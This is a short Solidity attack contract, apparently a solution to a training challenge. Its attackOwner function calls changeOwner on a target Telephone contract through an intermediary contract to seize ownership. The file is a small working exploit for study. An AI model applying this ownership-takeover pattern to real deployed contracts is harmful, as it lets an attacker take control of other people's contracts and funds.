// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract Attack {

    Telephone public telephone;

    constructor(address _telephone) {
        telephone = Telephone(_telephone);
    }

    function attackOwner(address newOwner) public {
        telephone.changeOwner(newOwner);
    }

}